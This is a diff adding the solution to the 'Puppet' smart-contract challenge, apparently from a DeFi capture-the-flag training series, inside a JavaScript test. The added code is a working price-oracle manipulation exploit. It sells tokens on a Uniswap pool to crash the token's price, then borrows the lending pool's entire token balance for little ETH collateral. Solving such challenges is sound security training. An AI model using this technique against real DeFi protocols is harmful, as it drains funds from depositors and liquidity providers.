@@ -103,6 +103,27 @@ describe('[Challenge] Puppet', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+
+        /**
+         * Let's start by selling my dvt tokens for eth on uniswap, 
+         * this will create an imbalance in the eth-dvt pair and will crash the price of the dvt token
+         */
+        await this.token.connect(attacker).approve(
+            this.uniswapExchange.address,
+            this.token.balanceOf(attacker.address)
+        )
+        await this.uniswapExchange.connect(attacker).tokenToEthSwapInput(
+            (await this.token.balanceOf(attacker.address)).sub(ethers.utils.parseEther('1')),
+            1,
+            ethers.utils.parseEther('100000')
+        )
+
+        //next we are able to borrow all the dvt tokens in the pool with a relatively small eth deposit
+        await this.lendingPool.connect(attacker).borrow( POOL_INITIAL_TOKEN_BALANCE,
+            {value: (await ethers.provider.getBalance(attacker.address)).sub(ethers.utils.parseEther('0.1'))}
+        );
+        
+
     });
 
     after(async function () {
